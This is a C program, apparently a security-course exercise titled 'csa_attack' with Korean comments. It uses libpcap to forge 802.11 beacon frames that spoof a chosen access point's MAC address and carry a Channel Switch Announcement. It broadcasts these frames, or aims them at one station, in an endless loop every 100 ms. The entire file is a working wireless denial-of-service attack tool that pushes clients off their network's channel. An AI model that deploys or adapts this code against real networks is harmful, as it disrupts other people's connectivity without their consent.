#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <linux/if_packet.h>

#define CSA_TAG_NUMBER 37
#define CSA_TAG_LENGTH 3
#define CHANNEL_SWITCH_MODE 1
#define NEW_CHANNEL_NUMBER 13
#define CHANNEL_SWITCH_COUNT 3

/* 와이어샤크에서 패킷확인 */
void create_csa_frame(const u_char *ap_mac, const u_char *station_mac, u_char *frame, int *frame_len) {
    // Frame Control, Duration, Addresses, Sequence Control, etc.
    u_char beacon_frame[] = {
        0x80, 0x00, // Frame Control: Beacon
        0x00, 0x00, // Duration
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: Broadcast or 지정된 station
        0xfe, 0x3e, 0x23, 0xe5, 0x05, 0x43, // Source: AP MAC
        0xfe, 0x3e, 0x23, 0xe5, 0x05, 0x43, // BSSID: AP MAC
        0xe0, 0x3f, // Sequence Control
        // Beacon Frame Body
        0x9a, 0x91, 0xfb, 0x94, 0xc0, 0xab, 0xd1, 0x00, //timestamps
        0x64, 0x00, // beacon interval
        0x11, 0x15  // Capability Info
    };

    memcpy(beacon_frame + 10, ap_mac, 6); // Set Source MAC
    memcpy(beacon_frame + 16, ap_mac, 6); // Set BSSID
    if (station_mac) {
        memcpy(beacon_frame + 4, station_mac, 6); // station_mac이 지정된 경우 -> Destination MAC 설정
    }

    int beacon_frame_len = sizeof(beacon_frame);

    // SSID element (example: "TestNetwork")
    u_char ssid_element[] = {
        0x00, 0x0b, // SSID Tag Number and Length
        'T', 'e', 's', 't', 'N', 'e', 't', 'w', 'o', 'r', 'k' // SSID: TestNetwork
    };

    int ssid_element_len = sizeof(ssid_element);

    // Channel Switch Announcement element
    u_char csa_element[] = {
        CSA_TAG_NUMBER, CSA_TAG_LENGTH, // Tag Number and Length
        CHANNEL_SWITCH_MODE, // Channel Switch Mode
        NEW_CHANNEL_NUMBER, // New Channel Number
        CHANNEL_SWITCH_COUNT // Channel Switch Count
    };

    int csa_element_len = sizeof(csa_element);

    u_char example_tag[] = {
        0x2a, 0x01, 0x00
    };
    int example_tag_len = sizeof(example_tag);

    // Combine all parts to form the final frame
    *frame_len = beacon_frame_len + ssid_element_len + csa_element_len + example_tag_len;
    memcpy(frame, beacon_frame, beacon_frame_len);
    memcpy(frame + beacon_frame_len, ssid_element, ssid_element_len);
    memcpy(frame + beacon_frame_len + ssid_element_len, csa_element, csa_element_len);
    memcpy(frame + beacon_frame_len + ssid_element_len + csa_element_len, example_tag, example_tag_len);
}

void send_csa_attack(const char *interface, const char *ap_mac_str, const char *station_mac_str) {
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    u_char frame[256];
    int frame_len;
    u_char ap_mac[6];
    u_char station_mac[6];

    // Convert MAC addresses from string to bytes
    sscanf(ap_mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &ap_mac[0], &ap_mac[1], &ap_mac[2],
           &ap_mac[3], &ap_mac[4], &ap_mac[5]);

    if (station_mac_str) {
        sscanf(station_mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &station_mac[0], &station_mac[1], &station_mac[2],
               &station_mac[3], &station_mac[4], &station_mac[5]);
    }

    handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", interface, errbuf);
        return;
    }

    while (1) {
        create_csa_frame(ap_mac, station_mac_str ? station_mac : NULL, frame, &frame_len);
        if (pcap_sendpacket(handle, frame, frame_len) != 0) {
            fprintf(stderr, "Error sending the packet: %s\n", pcap_geterr(handle));
        }
        usleep(100000); // Sleep to prevent network overload
    }

    pcap_close(handle);
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "syntax : csa_attack <interface> <ap mac> [<station mac>]\n");
        return 1;
    }

    const char *interface = argv[1];
    const char *ap_mac = argv[2];
    const char *station_mac = (argc > 3) ? argv[3] : NULL;

    send_csa_attack(interface, ap_mac, station_mac);

    return 0;
}
